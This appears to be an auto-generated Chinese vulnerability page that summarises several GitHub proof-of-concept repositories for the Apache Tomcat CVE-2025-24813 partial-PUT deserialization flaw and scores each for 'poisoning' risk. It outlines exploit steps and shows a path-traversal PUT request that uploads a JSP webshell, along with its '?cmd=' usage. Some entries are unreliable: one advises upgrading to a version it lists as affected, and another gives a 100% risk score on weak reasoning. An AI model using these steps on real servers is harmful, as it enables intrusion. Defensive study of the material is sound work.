**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

